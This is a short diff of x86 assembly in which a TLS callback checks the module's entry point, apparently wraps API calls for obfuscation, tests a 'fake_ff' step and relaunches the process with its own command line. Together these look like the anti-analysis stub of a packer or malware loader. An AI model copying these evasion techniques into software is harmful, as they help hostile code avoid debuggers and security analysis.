@@ -31,6 +31,13 @@ proc	callback handle,reason,reserved
 
 	cmp [reason],DLL_PROCESS_ATTACH
 	jnz .end!
+	invokex GetModuleHandleA,0
+	mov ecx,eax
+	add ecx,[ecx+3Ch]
+	mov ecx,[ecx+28h]
+	add eax,ecx
+	cmp eax,start
+	jne .end!
 	xor ebx,ebx
 	if DEBUG=0
 		fake_ff
@@ -39,8 +46,8 @@ proc	callback handle,reason,reserved
 		invokex GetLastError
 		.if eax<>0b7h
 			lea eax,[.s13]
-			invoke GetStartupInfoA,eax
-			invoke GetCommandLineA
+			invokex GetStartupInfoA,eax
+			invokex GetCommandLineA
 			lea edi,[.s13]
 			lea esi,[.s14]
 			invokex CreateProcessA,ebx,eax,ebx,ebx,ebx,ebx,ebx,ebx,edi,esi
